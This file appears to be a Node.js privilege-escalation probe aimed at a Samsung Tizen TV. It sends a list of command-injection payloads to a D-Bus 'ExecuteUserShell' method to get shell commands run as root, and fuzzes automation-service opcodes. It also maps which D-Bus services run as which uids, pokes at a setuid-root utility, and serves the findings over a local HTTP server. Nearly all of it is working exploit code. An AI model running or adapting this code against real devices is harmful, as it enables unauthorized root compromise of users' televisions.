'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8152;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe64h.txt';

var INNER = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var result = {};',

  // 1. ExecuteUserShell JSON variants — goal: get a shell command to run as uid=0
  // Format: {"cmd":"<fullpath>","args":["arg1","arg2"]} or similar
  // Exit 127 means the JSON input IS being parsed — try with full binary paths
  'var jcmds = [',
  '  \'{"cmd":"/usr/bin/id"}\',',
  '  \'{"cmd":"/bin/sh","args":["-c","id"]}\',',
  '  \'{"cmd":"/bin/sh","args":["-c","id > /tmp/pwn.txt 2>&1"]}\',',
  '  \'{"cmd":"/bin/sh","args":["-c","id > /home/owner/share/tmp/sdk_tools/pwn64.txt 2>&1"]}\',',
  '  \'{"type":"shell","cmd":"id"}\',',
  '  \'{"type":"exec","path":"/usr/bin/id","args":[]}\',',
  '  \'{"action":"exec","cmd":"/usr/bin/id"}\',',
  '  \'{"script":"id"}\',',
  '  \'{"shell":"/bin/sh -c id"}\',',
  '  \'{"run":"/usr/bin/id"}\',',
  '  \'{"exec":"/usr/bin/id > /tmp/pwn.txt"}\',',
  '  \'{"command":"/usr/bin/id"}\',',
  '  \'{"op":"shell","args":["-c","id"]}\',',
  '  \'["/usr/bin/id"]\',',
  '  \'["/bin/sh","-c","id > /tmp/pwn.txt 2>&1"]\'',
  '];',
  'result.jackpack_json = {};',
  'jcmds.forEach(function(cmd){',
  '  var key = cmd.slice(0,40);',
  '  try {',
  '    var r = cp.execSync(',
  '      "dbus-send --system --dest=com.jackpack.migration --type=method_call --print-reply /com/jackpack/migration com.jackpack.migration.ExecuteUserShell string:\'" + cmd.replace(/\'/g,"\'\\\'\'") + "\' 2>&1",',
  '      {timeout:6000}',
  '    );',
  '    result.jackpack_json[key] = r.toString().trim();',
  '  } catch(e) {',
  '    result.jackpack_json[key+"_err"] = (e.stdout ? e.stdout.toString() : "") + (e.stderr ? e.stderr.toString() : "") + e.message.slice(0,80);',
  '  }',
  '});',

  // Check if anything wrote to /tmp/pwn.txt
  'try { result.pwn_txt = fs.readFileSync("/tmp/pwn.txt","utf8"); } catch(e) { result.pwn_txt_err = e.message; }',
  'try { result.pwn64 = fs.readFileSync("/home/owner/share/tmp/sdk_tools/pwn64.txt","utf8"); } catch(e) { result.pwn64_err = e.message; }',

  // 2. Map ExecuteCommand opcodes 0-10 on automation-service (uid=0)
  'result.exec_cmd_map = {};',
  'for(var i=0; i<=10; i++){',
  '  (function(opcode){',
  '    try {',
  '      var r2 = cp.spawnSync("dbus-send", [',
  '        "--system",',
  '        "--dest=org.tizen.tv.automation-service",',
  '        "--type=method_call",',
  '        "--print-reply",',
  '        "/TIFacAutoObj",',
  '        "org.tizen.tv.automationservice.ExecuteCommand",',
  '        "int32:"+opcode, "int32:0"',
  '      ], {timeout:5000});',
  '      result.exec_cmd_map["op"+opcode] = {',
  '        out: r2.stdout ? r2.stdout.toString() : "",',
  '        err: r2.stderr ? r2.stderr.toString().slice(0,80) : "",',
  '        status: r2.status',
  '      };',
  '    } catch(e) { result.exec_cmd_map["op"+opcode+"_err"] = e.message; }',
  '  })(i);',
  '}',

  // 3. Enumerate all D-Bus services for uid=0
  // Parse the ListNames output we got before and query each
  'var allServices = [',
  '  "com.samsung.TVService.Signal.tvs1.tvs697",',
  '  "org.tizen.tv.gamepadservice",',
  '  "org.tizen.tv.litewebappservice.server",',
  '  "org.tizen.tv.webappservice.innerdbclient.obj927",',
  '  "org.tizen.tv.networkspeaker.server",',
  '  "org.tizen.tv.automation-service",',
  '  "eme.cdmbase.signalsource",',
  '  "com.samsung.TVService.Signal.tvs1.tvs38",',
  '  "com.samsung.TVService.Signal.tvs1.tvs593",',
  '  "com.samsung.TVService.Signal.tvs1.tvs534"',
  '];',
  'result.uid_map = {};',
  'allServices.forEach(function(svc){',
  '  try {',
  '    var r3 = cp.execSync(',
  '      "dbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.GetConnectionUnixUser string:" + svc + " 2>&1",',
  '      {timeout:3000}',
  '    );',
  '    var m = r3.toString().match(/uint32\\s+(\\d+)/);',
  '    result.uid_map[svc] = m ? m[1] : r3.toString().trim().slice(0,30);',
  '  } catch(e) { result.uid_map[svc] = "err"; }',
  '});',

  // 4. wasutility with different invocations — it's setuid root
  'var wasCmds = [',
  '  ["activate", "org.tizen.browser"],',
  '  ["list"],',
  '  ["status"],',
  '  ["get"],',
  '  ["info"]',
  '];',
  'result.wasutil_cmds = {};',
  'wasCmds.forEach(function(args){',
  '  try {',
  '    var r4 = cp.spawnSync("/usr/bin/wasutility", args, {timeout:3000});',
  '    result.wasutil_cmds[args.join(" ")] = {',
  '      out: r4.stdout ? r4.stdout.toString() : "",',
  '      err: r4.stderr ? r4.stderr.toString() : "",',
  '      status: r4.status',
  '    };',
  '  } catch(e) { result.wasutil_cmds[args.join(" ")+"_err"] = e.message; }',
  '});',

  // 5. Check /proc/self/status to verify our effective uid after execFile
  'try {',
  '  var selfStatus = fs.readFileSync("/proc/self/status","utf8");',
  '  result.self_uid = (selfStatus.match(/^Uid:\\s*(\\S+)/m)||[])[1];',
  '  result.self_capeff = (selfStatus.match(/^CapEff:\\s*(\\S+)/m)||[])[1];',
  '} catch(e) {}',

  'var out = JSON.stringify(result, null, 2);',
  'try { require("fs").writeFileSync("' + PROBE_FILE + '", out); } catch(e) {}',
  'process.stdout.write(out);'
].join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 60000 }, function(err, stdout, stderr) {
    var result;
    if (err) {
      result = JSON.stringify({ exec_error: err.message, stderr: stderr, stdout: stdout || '' });
    } else {
      result = stdout || '(empty)';
    }
    cb(result);
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(result) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(result);
  });
});

server.listen(PORT, function() {
  runProbe(function(result) {
    try { fs.writeFileSync(PROBE_FILE, result); } catch(e) {}
  });
});
